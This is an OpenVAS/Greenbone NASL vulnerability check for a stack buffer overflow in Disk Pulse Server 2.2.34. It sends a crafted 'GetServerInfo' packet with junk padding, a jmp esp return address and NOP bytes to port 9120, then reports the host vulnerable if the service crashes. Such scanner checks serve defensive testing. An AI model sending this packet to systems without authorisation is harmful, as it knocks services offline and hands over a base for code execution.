# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801528");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2010-10-22 15:51:55 +0200 (Fri, 22 Oct 2010)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("Disk Pulse Server Stack Remote Buffer Overflow Vulnerability");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/15238");
  script_xref(name:"URL", value:"http://securityreason.com/exploitalert/9258");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_family("Buffer overflow");
  script_dependencies("find_service.nasl");
  script_require_ports(9120);

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to cause a
  stack-based buffer overflow via a specially crafted packet sent to TCP
  port 912 which results in denial of service condition.");

  script_tag(name:"affected", value:"Disk Pulse Server version 2.2.34 and prior");

  script_tag(name:"insight", value:"The flaw is due to a boundary error in 'libpal.dll' when
  handling network messages and the way Disk Pulse Server process
  a remote clients 'GetServerInfo' request.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"Disk Pulse Server is prone to remote stack buffer overflow vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

dpPort = 9120;
if(!get_port_state(dpPort))
  exit(0);

soc = open_sock_tcp(dpPort);
if(!soc)
  exit(0);

for(i=0; i<3; i++) {

  string = crap(data:"A", length:218);

  ## ASCII = "GetServerInfo.
  packet_header =("\x47\x65\x74\x53\x65\x72\x76\x65\x72\x49\x6E\x66\x6F\x02");

  ## 256 byte junk buffer to reach eip
  junk = crap(data:"x41", length:256);

  ## jmp esp (via ws2_32.dll)
  eip = "\xFB\xF8\xAB\x71";
  nops = crap(data:"x90", length:12);

  ## packet structure
  packet = packet_header + junk + eip + nops + string + nops + nops;

  ## Send the constructed request to port 9120
  send(socket:soc, data:packet);

  sleep(10);

  soc = open_sock_tcp(dpPort);
  if(!soc) {
    security_message(port:dpPort);
    exit(0);
  }
}
